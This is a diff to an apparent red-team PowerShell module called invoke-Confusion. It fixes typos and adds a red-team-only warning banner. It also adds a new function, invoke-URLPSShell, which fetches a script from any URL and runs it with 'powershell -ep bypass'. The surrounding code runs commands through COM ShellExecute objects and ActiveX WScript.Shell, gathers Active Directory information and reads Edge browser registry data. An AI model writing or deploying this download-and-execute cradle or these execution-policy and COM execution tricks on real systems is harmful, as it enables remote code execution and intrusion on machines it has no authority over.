@@ -1,5 +1,6 @@
 <#
 
+
 #######################################################################################
 #######################################################################################
 ##  _                 _               _____              __           _              ##
@@ -40,7 +41,7 @@
 
  
   .Author ( @harr0ey ) 
-  .Lisence BSD3 
+  .License BSD3 
   .Required Dependencies: None
   .Optional Dependencies: None
 
@@ -91,13 +92,29 @@
     PS:> invoke-ApplicationShellExecute -CML calc.exe
 
 
-      .Example
+  .Example
+    PS:> invoke-URLPSShell -URI URL!
+
+  .Example
     PS:> 
 
 
 
-
 #>
+
+$obj = '''
+
+Author Mat harr0ey @harr0ey
+
+  ( Should You Accept These Conditions )
+1 Reject Manipulate in Modules invoke-Confusion!
+2 Permit Use: Pertain For Red Teamer Only!
+3 Exit!
+'''
+[void] [System.Reflection.Assembly]::LoadWithPartialName("Microsoft.VisualBasic")
+
+[Microsoft.VisualBasic.Interaction]::MsgBox("$obj.", "OKOnly,SystemModal,Information", "Attention Powershell")
+
 Write-Host -ForegroundColor Green "
  _                 _               _____              __           _             
 (_)               | |             /  __ \            / _|         (_)            
@@ -118,7 +135,8 @@ Write-Host -ForegroundColor Green "
 9  invoke-invoke-DxCap -CML notepad.exe
 10 invoke-ApplicationShellExecute -CML calc.exe  
 11 invoke-ADinfo -Type List    
-12 Get-TokenMsftEdge -Type List                                                                      
+12 Get-TokenMsftEdge -Type List
+13 invoke-URLPSShell -URI URL!                                                                      
                                                                                  
 "
 Read-Host -Prompt Enter
@@ -130,7 +148,7 @@ Read-Host -Prompt Enter
 
 
   .Author ( @harr0ey ) 
-  .Lisence BSD3 
+  .License BSD3 
   .Required Dependencies: None
   .Optional Dependencies: None
 
@@ -169,13 +187,63 @@ Read-Host -Prompt Enter
 
 
 
+
+function invoke-URLPSShell {
+<#
+
+
+ .Author Matt harr0ey @harr0ey
+ .License BSD3
+ .Required Dependencies : None 
+ .Optional Dependencies : None 
+
+ .Description vicarious of Broadly Execute in Natural Mode Powershell Remotely Script 
+
+ .Exmaple 
+  PS:> invoke-URLPSShell -URI !URLScript
+
+#>
+
+
+    [CmdletBinding()]
+
+        param (
+
+     [Parameter(Mandatory=$true)]
+
+     [Parameter(Position = 0, ParameterSetName = 'URI')]
+
+     [string]
+     $URI
+     
+     )
+
+     if ($URI) {
+     
+     try {
+     $Conveyor = Invoke-WebRequest $URI
+      powershell -ep bypass /c $Conveyor
+     
+     }Catch {
+      
+      throw "[ ! ] Error Via Non-entrance The URL" 
+
+      }
+
+         }
+
+}
+
+
+
+
  function invoke-ADinfo {
 
  <#
 
 
   .Author ( @harr0ey ) 
-  .Lisence BSD3 
+  .License BSD3 
   .Required Dependencies: None
   .Optional Dependencies: None
 
@@ -217,7 +285,7 @@ Read-Host -Prompt Enter
 
 
   .Author ( @harr0ey ) 
-  .Lisence BSD3 
+  .License BSD3 
   .Required Dependencies: None
   .Optional Dependencies: None
 
@@ -311,7 +379,7 @@ Get-ItemProperty -Path $SnifferEdgedrag
 
 
   .Author ( @harr0ey ) 
-  .Lisence BSD3 
+  .License BSD3 
   .Required Dependencies: None
   .Optional Dependencies: None
 
@@ -353,7 +421,7 @@ function invoke-XMLTransform {
 
  <#
    .Author ( bohop )
-   .Licence BSD3
+   .License BSD3
    
    Require Dependencies : None 
    Optional Dependencies : None 
@@ -418,14 +486,12 @@ var r = new ActiveXObject("WScript.Shell").Run("notepad.exe");
   function invoke-VBNET {
   <#
   
-       .Author Matt Harr0ey
+      .Author Matt Harr0ey
+      .License BSD3
+      .Require  Dependencies : None
+      .Optional Dependencies : None
       
-      .Licence BSD3
-      
-      Require  Dependencies : None
-      Optional Dependencies : None
-      
-      .Broadly 
+       Broadly 
        Command line CML Execution using .NET VisualBasic Object 
 
 
@@ -752,7 +818,7 @@ $ExampleLLMT16.Application.Application.Application.Application.ShellExecute("pca
               try {
               $ExampleLLMT31.Application.Application.Application.Application.ShellExecute("$Command")
               } catch {
-               theow "Add Your Command"
+               throw "Add Your Command"
               
               }
               
